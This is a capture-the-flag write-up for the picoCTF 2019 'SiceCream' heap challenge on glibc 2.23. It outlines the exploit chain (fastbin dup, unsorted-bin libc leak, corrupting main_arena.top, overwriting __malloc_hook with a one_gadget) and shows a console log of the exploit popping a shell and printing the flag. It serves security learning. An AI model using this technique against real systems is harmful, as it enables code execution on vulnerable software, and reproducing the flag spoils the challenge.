# SiceCream

A heap exploitation challenge from picoctf 2019.
The glibc version used is 2.23 (no tcache, house of orange via unsorted bin attack is possible)
## Exploit steps:
* Use fatbins dup to create a chunk inside name variable in data (fixed address)
* Reintroduce in order to change the chunk's size to smallbin size
* Free that chunk and use reintroduce to read unsorted bin fd/bk to get a libc leak
* use fastbin dup to create another chunk inside name, and fill it with p64(0) thus getting more allocations ('buy ice cream') from the program
* use fatbins dup to write a size filed into main_arena (top overwrite main_arena.top)
* use fastbin dup with the size written in main arena to overwerite top chunk ptr to __malloc_hook - 0x23 (location of a fake chunk)
* overwrite __malloc_hook with one_gadget using the curropted top chunk ptr
* double free a chunk thus triggering a call to malloc() and popping a shell
```console
orkinyo@ubuntu:~/ctfs/pico/sice_cream/sice_cream_final$ python3 exploit.py 
[*] '/home/orkinyo/ctfs/pico/sice_cream/sice_cream_final/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
[*] '/home/orkinyo/ctfs/pico/sice_cream/sice_cream_final/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to jupiter.challenges.picoctf.org on port 9521: Done
[+] leak = 0x7f6f54148b78
[+] libc load address = 0x7f6f53d84000
[+] got more chunks to malloc
[+] got fake chunk in main arena, size = 0x61
[+] got more chunks to malloc
[+] overwrote main_arena.top with address of __malloc_hook - 0x23 = 0x7f6f54148aed
[+] overwrote __malloc_hook with one_gadget
[*] triggering double free() to call malloc()
[+] ---pwned!---
[*] Switching to interactive mode
*** Error in `/problems/sice-cream_1_dea8d3391cf318aa30fdf76bee8d9120/sice_cream': double free or corruption (fasttop): 0x0000000000ffd2a0 ***
$ whoami
sice-cream_1
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_2c4930c6}
```